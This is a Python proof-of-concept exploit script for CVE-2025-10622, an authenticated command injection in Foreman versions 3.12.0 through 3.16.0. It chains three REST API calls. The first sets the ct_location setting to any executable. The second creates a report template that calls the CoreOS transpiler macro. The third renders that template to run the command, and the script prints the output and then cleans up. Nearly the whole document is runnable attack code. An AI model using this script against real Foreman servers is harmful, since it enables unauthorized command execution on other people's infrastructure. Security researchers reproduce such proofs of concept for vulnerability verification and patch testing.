#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Foreman OS Command Injection via Transpiler Setting
# CVE            : CVE-2025-10622
# Vendor         : The Foreman Project / Red Hat
# Product        : Foreman
# Affected       : 3.12.0 through 3.16.0 (inclusive)
# Type           : CWE-78 / CWE-602
# CVSS           : 8.0 (High)
# Platform       : Ruby / Rails
# Author         : Exploit Intelligence Platform (dev@exploit-intel.com)
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-27
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC for CVE-2025-10622: Foreman OS Command Injection via ct_location Setting

Demonstrates OS command injection (CWE-78) in Foreman 3.12.0 through 3.16.0.
An authenticated admin user can bypass client-side-only whitelist validation of the
CoreOS transpiler path (ct_location) via the REST API, then trigger arbitrary command
execution through template rendering.

The attack chain:
  1. PUT /api/v2/settings/ct_location - Set transpiler path to arbitrary executable
     (server accepts any value; whitelist is only enforced on the client-side UI)
  2. POST /api/v2/report_templates - Create a template calling transpile_coreos_linux_config()
  3. POST /api/v2/report_templates/:id/generate - Render the template, triggering execution
     of the attacker-controlled binary via Open3.capture3 in Foreman::CommandRunner

Requirements:
  - Authenticated user with 'edit_settings' permission (admin by default)
  - Python 3 standard library only (no third-party dependencies)

Usage:
  python3 poc.py <target_host> [port] [username] [password] [command]

Examples:
  python3 poc.py 172.22.0.5                          # Runs /usr/bin/id (default)
  python3 poc.py 172.22.0.5 3000 admin changeme /usr/bin/whoami
  python3 poc.py 172.22.0.5 3000 admin changeme /bin/cat  # reads stdin from template input
"""

import sys
import json
import base64
import urllib.request
import urllib.error
import urllib.parse
import time
import textwrap

# Default configuration for CVEForge lab environment
DEFAULT_HOST = "172.22.0.5"
DEFAULT_PORT = 3000
DEFAULT_USER = "admin"
DEFAULT_PASS = "changeme"
DEFAULT_CMD = "/usr/bin/id"

# Original safe values for cleanup
ORIGINAL_CT_LOCATION = "/usr/bin/ct"


def print_banner(target, username, password, command_path):
    """Print exploit run banner."""
    print("=" * 78)
    print("  CVE-2025-10622: Foreman OS Command Injection via ct_location")
    print("  Exploit Intelligence Platform | exploit-intel.com")
    print("=" * 78)
    print(f"Target:  {target}")
    print(f"Auth:    {username}:{'*' * len(password)}")
    print(f"Command: {command_path}")
    print("=" * 78)


class ForemanExploit:
    """CVE-2025-10622: Foreman OS Command Injection via ct_location bypass."""

    def __init__(self, host, port, username, password):
        self.base_url = f"http://{host}:{port}"
        self.username = username
        self.password = password
        self.auth_header = self._make_auth_header(username, password)
        self.report_template_id = None

    @staticmethod
    def _make_auth_header(username, password):
        """Create HTTP Basic Authentication header."""
        credentials = base64.b64encode(f"{username}:{password}".encode()).decode()
        return f"Basic {credentials}"

    def _api_request(self, method, path, data=None):
        """Make an authenticated API request to Foreman."""
        url = f"{self.base_url}{path}"
        headers = {
            "Authorization": self.auth_header,
            "Content-Type": "application/json",
            "Accept": "application/json",
        }

        body = None
        if data is not None:
            body = json.dumps(data).encode("utf-8")

        req = urllib.request.Request(url, data=body, headers=headers, method=method)

        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                content_type = resp.headers.get("Content-Type", "")
                response_body = resp.read().decode("utf-8")
                if "json" in content_type:
                    return resp.status, json.loads(response_body)
                return resp.status, response_body
        except urllib.error.HTTPError as e:
            response_body = e.read().decode("utf-8")
            try:
                return e.code, json.loads(response_body)
            except json.JSONDecodeError:
                return e.code, response_body
        except urllib.error.URLError as e:
            print(f"[!] Connection error: {e.reason}")
            return None, None
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
            return None, None

    def check_target(self):
        """Step 0: Verify target is a vulnerable Foreman instance."""
        print("[*] Step 0: Checking target Foreman instance...")
        status, data = self._api_request("GET", "/api/v2/status")

        if status is None:
            print(f"[!] Cannot connect to {self.base_url}")
            return False

        if status == 401:
            print("[!] Authentication failed - check credentials")
            return False

        if status != 200:
            print(f"[!] Unexpected response: HTTP {status}")
            return False

        version = data.get("version", "unknown")
        print(f"[+] Foreman {version} detected (status: {data.get('result', 'unknown')})")

        # Check if version is in vulnerable range (3.12.0 - 3.16.0)
        try:
            parts = [int(x) for x in version.split(".")]
            major, minor, patch = parts[0], parts[1], parts[2] if len(parts) > 2 else 0
            if major == 3 and 12 <= minor <= 16 and not (minor >= 15 and patch >= 1):
                print(f"[+] Version {version} is in the vulnerable range (3.12.0 - 3.16.0)")
            elif major == 3 and minor >= 17:
                print(f"[!] Version {version} may be patched (>= 3.17.0)")
            else:
                print(f"[*] Version {version} - vulnerability status uncertain")
        except (ValueError, IndexError):
            print(f"[*] Could not parse version: {version}")

        return True

    def read_current_setting(self):
        """Read the current ct_location setting value."""
        status, data = self._api_request("GET", "/api/v2/settings/ct_location")
        if status == 200:
            return data.get("value", "unknown")
        return None

    def set_ct_location(self, command_path):
        """
        Step 1: Set ct_location to an arbitrary executable path.

        This bypasses the client-side whitelist (/usr/bin/ct, /usr/local/bin/ct)
        because the server performs NO validation on the setting value.
        The whitelist is only enforced via a UI dropdown 'collection' parameter.
        """
        print(f"\n[*] Step 1: Setting ct_location to '{command_path}' via API...")
        print(f"    Target endpoint: PUT /api/v2/settings/ct_location")

        # Read current value first
        current = self.read_current_setting()
        if current:
            print(f"    Current value: {current}")
            select_status, select_data = self._api_request(
                "GET", "/api/v2/settings/ct_location"
            )
            if select_status == 200:
                whitelist = select_data.get("select_values", {})
                if whitelist:
                    print(f"    Client-side whitelist: {list(whitelist.keys())}")
                    print(f"    [*] Bypassing whitelist - sending '{command_path}' directly via API")

        # Set the malicious value
        payload = {"setting": {"value": command_path}}
        status, data = self._api_request("PUT", "/api/v2/settings/ct_location", payload)

        if status == 200:
            new_value = data.get("value", "unknown") if isinstance(data, dict) else "unknown"
            print(f"    [+] SUCCESS: ct_location changed to '{new_value}'")
            print(f"    [+] Server accepted arbitrary path - NO server-side validation!")
            return True
        elif status == 422:
            # This would happen on a PATCHED version
            error_msg = ""
            if isinstance(data, dict):
                error_msg = data.get("error", {}).get("message", str(data))
            print(f"    [-] REJECTED: Server validated the input (patched?)")
            print(f"    [-] Error: {error_msg}")
            return False
        else:
            print(f"    [!] Unexpected response: HTTP {status}")
            if isinstance(data, dict):
                print(f"    [!] Response: {json.dumps(data, indent=2)}")
            return False

    def create_trigger_template(self):
        """
        Step 2: Create a report template that calls transpile_coreos_linux_config().

        This macro reads Setting[:ct_location] and passes it to
        Foreman::CommandRunner, which executes it via Open3.capture3.
        The input string is passed as stdin to the executed command.
        """
        print(f"\n[*] Step 2: Creating trigger template with transpiler macro...")

        # The template ERB code that triggers the vulnerability
        # transpile_coreos_linux_config() requires valid YAML input (validate_input=true by default)
        template_code = '<%= transpile_coreos_linux_config("---\\ntest: true") %>'

        payload = {
            "report_template": {
                "name": f"CVE-2025-10622-PoC-{int(time.time())}",
                "template": template_code,
            }
        }

        print(f"    Template code: {template_code}")
        print(f"    Target endpoint: POST /api/v2/report_templates")

        status, data = self._api_request("POST", "/api/v2/report_templates", payload)

        if status in (200, 201) or (isinstance(data, dict) and "id" in data):
            self.report_template_id = data["id"]
            print(f"    [+] Template created with ID: {self.report_template_id}")
            print(f"    [+] Template name: {data.get('name', 'unknown')}")
            return True
        else:
            print(f"    [!] Failed to create template: HTTP {status}")
            if isinstance(data, dict):
                print(f"    [!] Response: {json.dumps(data, indent=2)}")
            return False

    def trigger_execution(self):
        """
        Step 3: Generate (render) the template, triggering command execution.

        The rendering pipeline:
          1. ERB template calls transpile_coreos_linux_config("---\\ntest: true")
          2. transpilers.rb:18 reads Setting[:ct_location] (our malicious path)
          3. transpilers.rb:19 creates Foreman::CommandRunner with [malicious_path] + args
          4. command_runner.rb:36 calls Open3.capture3(*cmd, stdin_data: input)
          5. The malicious binary executes, output is returned in the template response
        """
        if not self.report_template_id:
            print("[!] No template to trigger - call create_trigger_template() first")
            return None

        print(f"\n[*] Step 3: Generating template to trigger command execution...")
        print(f"    Target endpoint: POST /api/v2/report_templates/{self.report_template_id}/generate")
        print(f"    Execution path: ERB -> transpile_coreos_linux_config() -> CommandRunner -> Open3.capture3")

        status, data = self._api_request(
            "POST",
            f"/api/v2/report_templates/{self.report_template_id}/generate",
            {},
        )

        if status == 200:
            output = data if isinstance(data, str) else json.dumps(data)
            print(f"\n    {'=' * 60}")
            print(f"    COMMAND OUTPUT:")
            print(f"    {'=' * 60}")
            for line in output.strip().split("\n"):
                print(f"    | {line}")
            print(f"    {'=' * 60}")
            return output
        else:
            print(f"    [!] Template generation failed: HTTP {status}")
            if isinstance(data, dict):
                error_msg = data.get("error", {}).get("message", str(data))
                print(f"    [!] Error: {error_msg}")
            elif isinstance(data, str):
                print(f"    [!] Response: {data[:500]}")
            return None

    def cleanup(self):
        """Restore ct_location to its original value and delete the PoC template."""
        print(f"\n[*] Cleanup: Restoring original settings...")

        # Delete the trigger template
        if self.report_template_id:
            status, _ = self._api_request(
                "DELETE", f"/api/v2/report_templates/{self.report_template_id}"
            )
            if status == 200:
                print(f"    [+] Deleted PoC template (ID: {self.report_template_id})")
            else:
                print(f"    [!] Failed to delete template (HTTP {status})")

        # Restore ct_location
        payload = {"setting": {"value": ORIGINAL_CT_LOCATION}}
        status, data = self._api_request("PUT", "/api/v2/settings/ct_location", payload)
        if status == 200:
            print(f"    [+] Restored ct_location to '{ORIGINAL_CT_LOCATION}'")
        else:
            print(f"    [!] Failed to restore ct_location (HTTP {status})")

    def exploit(self, command_path):
        """
        Full exploit chain for CVE-2025-10622.

        Args:
            command_path: Absolute path to the command to execute (e.g., /usr/bin/id)

        Returns:
            Command output string if successful, None otherwise.
        """
        print_banner(self.base_url, self.username, self.password, command_path)

        # Step 0: Verify target
        if not self.check_target():
            return None

        # Step 1: Bypass whitelist and set malicious ct_location
        if not self.set_ct_location(command_path):
            print("\n[-] EXPLOIT FAILED: Could not set ct_location")
            print("[-] The server may be patched (>= 3.15.1, 3.16.1, or 3.17.0)")
            return None

        # Step 2: Create trigger template
        if not self.create_trigger_template():
            print("\n[-] EXPLOIT FAILED: Could not create trigger template")
            self.cleanup()
            return None

        # Step 3: Trigger command execution
        output = self.trigger_execution()

        if output:
            print(f"\n[+] EXPLOIT SUCCESSFUL!")
            print(f"[+] Arbitrary command '{command_path}' executed as the Foreman process user")
            print(f"[+] This confirms CVE-2025-10622 - client-side-only whitelist bypass")
        else:
            print(f"\n[-] EXPLOIT FAILED: Command execution did not return output")

        # Cleanup
        self.cleanup()

        return output


def main():
    """Parse arguments and run the exploit."""
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    username = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_USER
    password = sys.argv[4] if len(sys.argv) > 4 else DEFAULT_PASS
    command = sys.argv[5] if len(sys.argv) > 5 else DEFAULT_CMD

    # Validate command path
    if not command.startswith("/"):
        print(f"[!] Command must be an absolute path (got: {command})")
        print(f"[!] Example: /usr/bin/id, /usr/bin/whoami, /bin/cat")
        sys.exit(1)

    exploit = ForemanExploit(host, port, username, password)

    try:
        result = exploit.exploit(command)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        exploit.cleanup()
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unhandled error: {e}")
        exploit.cleanup()
        sys.exit(1)

    if result:
        sys.exit(0)
    else:
        sys.exit(1)


if __name__ == "__main__":
    main()
